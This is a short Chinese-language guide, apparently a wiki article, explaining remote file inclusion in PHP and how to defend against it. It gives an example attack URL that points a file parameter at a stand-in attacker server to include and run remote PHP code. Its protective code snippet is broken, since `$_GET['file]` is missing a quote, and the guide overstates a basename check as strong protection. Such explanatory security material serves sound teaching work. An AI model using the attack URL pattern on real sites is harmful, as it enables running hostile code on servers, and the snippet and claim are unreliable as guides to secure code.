---
title: Remote File Inclusion
localeTitle: 远程文件包含
---
## 远程文件包含

程序员需要用户提供的文件输入而不是在访问所请求的文件之前清理输入而导致的应用程序漏洞。这会导致从远程服务器中提取文件，并将其包含在不应该存在的位置。

### 示例远程文件包含攻击

网站允许您将PDF视为`download.php?file=myfile.php` ，因为缺乏正确的检查，恶意用户可以请求远程资源并包含在脚本中。 URL可以成为`download.php?file=http://myevilserver.gtld/evilcode.php`然后可以输出给用户，或者在严重的情况下运行服务器上的实际PHP代码。

### 在PHP中保护您的网站免受远程文件包含攻击

以下PHP代码将提供针对远程文件包含攻击的强大保护

```PHP
<?php 
 if(basename($_GET['file]) !== $_GET['file']) { 
  die('INVALID FILE REQUESTED'); 
 } 
```

*   您可以在php.ini文件中禁用`allow_url_fopen`作为防止远程文件包含的附加保护。

#### 更多信息：

*   [OWASP Wiki - 测试远程文件包含](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)